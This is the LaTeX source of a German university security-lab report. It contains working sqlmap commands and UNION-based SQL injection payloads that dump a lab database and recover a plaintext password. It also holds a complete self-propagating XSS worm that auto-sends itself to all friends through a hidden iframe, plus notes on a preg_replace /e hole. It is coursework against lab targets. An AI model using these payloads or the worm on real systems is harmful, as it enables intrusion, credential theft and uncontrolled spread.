\documentclass[10pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage{todo}
\usepackage[ngerman]{babel}
\usepackage[left=2cm]{geometry}

\usepackage{listings}
\usepackage{color}
\definecolor{lightgray}{rgb}{.9,.9,.9}
\definecolor{darkgray}{rgb}{.4,.4,.4}
\definecolor{purple}{rgb}{0.65, 0.12, 0.82}

\lstdefinelanguage{JavaScript}{
  keywords={typeof, new, true, false, catch, function, return, null, catch, switch, var, if, in, while, do, else, case, break},
  keywordstyle=\color{blue}\bfseries,
  ndkeywords={class, export, boolean, throw, implements, import, this},
  ndkeywordstyle=\color{darkgray}\bfseries,
  identifierstyle=\color{black},
  sensitive=false,
  comment=[l]{//},
  morecomment=[s]{/*}{*/},
  commentstyle=\color{purple}\ttfamily,
  stringstyle=\color{red}\ttfamily,
  morestring=[b]',
  morestring=[b]"
}

\lstset{
   language=JavaScript,
   backgroundcolor=\color{lightgray},
   extendedchars=true,
   basicstyle=\footnotesize\ttfamily,
   showstringspaces=false,
   showspaces=false,
   numbers=left,
   numberstyle=\footnotesize,
   numbersep=9pt,
   tabsize=2,
   breaklines=true,
   showtabs=false,
   captionpos=b
}


\author{Christoph Robbert 6577945, Peter Stilow 6500440}
\title{Protokoll 2}
\begin{document}
\maketitle
 
\section*{Aufgabe 1}

\subsection*{a)}
\begin{itemize}
	\item Die \textit{Union} Klausel kann zum extrahieren von Daten benutzt werden. Das ursprüngliche Anfrage wird so abgeändert das ihre Ergebnisse oder Teilergebnisse mit den Ergebnissen einer anderen (vom Angreifer bestimmten) Abfrage vereint werden. Da die Ergebnisse nur vereint werden, bleibt die Struktur der resultierenden Tabelle gleich und die Anwendung gibt die Ergebnisse des durch \textit{Union} angehängten \textit{SELECT} Statements mit aus.
	\item Wenn der Angreifer weiß, wie viele Spalten die eigentliche Anfrage hatte, kann er eine Injection zusammenstellen, die wieder genauso viele Spalten hat als Ergebnis. Dies ist wichtig, da die Daten aus den Anfragen selten direkt dem Nutzer gezeigt werden. Meistens werden sie noch durch eine Logik der Anwendung verarbeitet und aufbereitet. Wenn die Injection nun nicht die richtige Spaltenanzahl hat werden die meisten Anwendung die Darstellung abbrechen und nur einen Fehler zeigen. Wenn das Ziel des Angriffs eine Manipulation der Daten ist, kann dies ausreichen. Will der Angreifer aber Daten aus der Datenbank erhalten, will er diese auch angezeigt bekommen.
	\item 
\end{itemize}

\subsection*{b)}
Zuerst im Browser mal auf den shop gehen und schauen, was er so macht. Man musste unten nmap oder wireshark auswählen und dann auf Details ansehen klicken. Hierdurch wurde man auf die Seite "`details\_tools.php"' weitergeleitet und bekommt ein paar daten über z.B. Wireshark.

Durch das Firefox-plugin Tamper Data konnten wir herausfinden, dass als Post dabei der wert tool=1 (für nmap) bzw tool=2 (für wireshark) übergeben werden. Dies können wir ausnutzen, um mit sqlmap die Datenbank(en) anzuschauen. Hierfür benutzen wir zunächst folgenden Befehl:
\begin{verbatim}
sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --tables
\end{verbatim}
Der gibt uns sowohl die vorhandenen Datenbanken, als auch die dazu gehörigen Tabellen:

\begin{verbatim}
Database: webshop
[2 tables]
+---------------------------------------+
| artikel                               |
| logs                                  |
+---------------------------------------+
\end{verbatim}

\begin{verbatim}
Database: secureuserdata
[1 table]
+---------------------------------------+
| accessdata                            |
+---------------------------------------+
\end{verbatim}

\begin{verbatim}
Database: information_schema
[28 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| KEY_COLUMN_USAGE                      |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+
\end{verbatim}

\begin{verbatim}
Database: mysql
[23 tables]
+---------------------------------------+
| user                                  |
| columns_priv                          |
| db                                    |
| event                                 |
| func                                  |
| general_log                           |
| help_category                         |
| help_keyword                          |
| help_relation                         |
| help_topic                            |
| host                                  |
| ndb_binlog_index                      |
| plugin                                |
| proc                                  |
| procs_priv                            |
| servers                               |
| slow_log                              |
| tables_priv                           |
| time_zone                             |
| time_zone_leap_second                 |
| time_zone_name                        |
| time_zone_transition                  |
| time_zone_transition_type             |
+---------------------------------------+
\end{verbatim}

Die erste Datenbank (webshop) sah nicht wichtig für Benutzerdaten aus, da sie als Tabellen nur artikel und logs besaß. Die nächste Datenbank jedoch hieß secureuserdata und besaß eine tabelle accessdata.
Diese tabelle haben wir zunächst nach Passwörtern durchsuchen lassen (mit dem --passwords befehl):\\

sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --passwords -D secureuserdata -T accessdata\\

Es gab einige Ergebnisse, allerdings keins, mit dem namen jack (sondern nur sowas wie root, phpmyadmin usw.). Da alle diese Passwörter gehashed waren haben wir die Tabelle einfach mal so via --dump Befehl ausgeben lassen. Dabei haben wir den user jack angegeben:\\

sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --dump -D secureuserdata -T accessdata -U jack\\

Das Ergebnis war der Eintrag jack mit der id 3 und dem passwort london. Demnach wurde das Passwort wohl unverschlüsselt in der Tabelle abgelegt.


Alternative: direkt über die Internetseite Query's abschicken.
\begin{verbatim}
'UNION SELECT NULL,schema_name,NULL,NULL FROM information_schema.schemata LIMIT 2,1;#

'UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='secureuserdata';#

'UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='accessdata' AND table_schema='secureuserdata' LIMIT 1,1;#
user
'UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='accessdata' AND table_schema='secureuserdata' LIMIT 2,1;#
password

'UNION SELECT NULL,user,password,NULL FROM secureuserdata.accessdata LIMIT 1,1;#
'UNION SELECT NULL,user,password,NULL FROM secureuserdata.accessdata WHERE user='jack';#
\end{verbatim}


\subsection*{c)}

\section*{Aufgabe 2}

\subsection*{a)}

Versand: Do.28 November 15.54 von peter\_bernd1@hell.sex nach peter\_bernd2@hell.sex.


Das Listing \ref{berndbookworm} zeigt unsere Version des Berndbookworm. Dabei enthält das Listing die initiale Nachricht. Wir benutzen ein iFrame um die Website \texttt{http://berndbook.seclab.uni-paderborn.de/send.php} mit den Anmeldedaten vom aktuellen Benutzer aufzurufen. Damit dies nicht auffällt verstecken wir den iFrame per CSS Befehlen. Danach laden wir jQuery nach um uns die Arbeit mit den Website Elementen zu vereinfachen. In Zeile 8 fängt unser eigentliches Angriffskript an. Die Funktion \texttt{reproduction} führt die eigentliche Reproduktion aus. Es setzt die selbe Nachricht noch einmal zusammen. Dabei wird der aktuelle Parameter n um eins verringert. Dies sorgt dafür, dass sich das Skript nur \textit{b} mal verbreitet. Anschließend setzt das Skript diese Nachricht in das Formular auf der Unterseite \texttt{send.php} ein. Dann werden alle Checkboxen, die die Freunde repräsentiert ausgefüllt und das Formular abgeschickt. Damit die leere Nachricht den Benutzern nicht sofort auffällt haben wir einen Text ("CHello my freend!") und ein Bild in die Nachricht eingefügt.

\begin{lstlisting}[caption=Berndbookworm, label=berndbookworm]
CHello my freend!
<img src="https://alcapwn.de/logo.png" />
<iframe src="http://berndbook.seclab.uni-paderborn.de/send.php" name="send_in_a_box" style="visibility:hidden;" width="0" height="0"></iframe>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js">
</script>

<script type="text/javascript">

function reproduction(n){
	if (n >0){
		reproduction_function = reproduction.toString();
		iframe_string = "CHello my freend!<img src=\"https://alcapwn.de/logo.png\"\/><iframe src=\"http://berndbook.seclab.uni-paderborn.de/send.php\" name=\"send_in_a_box\" style=\"visibility:hidden;\" width=\"0\" height=\"0\"></iframe>";
		jquery_string = "<script type=\"text/javascript\" src=\"http://code.jquery.com/jquery-1.10.2.min.js\"><\/script>";
		script_start = "<script type=\"text/javascript\">";
		function_call = "$('body').attr('onload','reproduction(" + (n-1) + ");');"
		script_end = "<\/script>";
		msg = iframe_string + jquery_string + script_start + reproduction_function + function_call + script_end;
		$('iframe').contents().find('textarea').val(msg);
		$('iframe').contents().find('input[type=checkbox]').click();
		$("iframe").contents().find("input[type=submit]").click()
	}
}

$('body').attr('onload','reproduction(2);');
</script>
\end{lstlisting}

\subsection*{b)}
Eine Möglichkeit die Ausbreitungsgeschwindigkeit zu reduzieren wäre die Nachricht beim sehen nur mit einer gewissen Wahrscheinlichkeit weiterzusenden. Über diese Wahrscheinlichkeit lässt sich dann die Geschwindigkeit regulieren. Um sicherzustellen, dass jeder User die Nachricht auch bekommt/weiterschickt, muss man dafür sorgen, dass der User die Nachricht nicht löscht bevor sie weitergeschickt wurde. Dies kann man erreichen, indem man die Nachricht vor dem User versteckt. Dafür könnte man per JavaScript die Website so anpassen, dass die Nachricht nicht angezeigt wird bis sie weitergeschickt wurde.

\section*{Aufgabe 3}

Der Leetspeakgenerator enthält eine Sicherheitslücke in der 1337.php. Die verwendete Funktion preg_replace, die in Zeile 16 mit dem Modifikator "\textit{e}" aufgerufen wird, kann dazu ausgenutzt werden. Damit wir einfacher auf 1337.php Datei zugreifen konnten, benutzten wir einen RESTClient und bauten die Anfrage an die 1337.php nach. 
\end{document}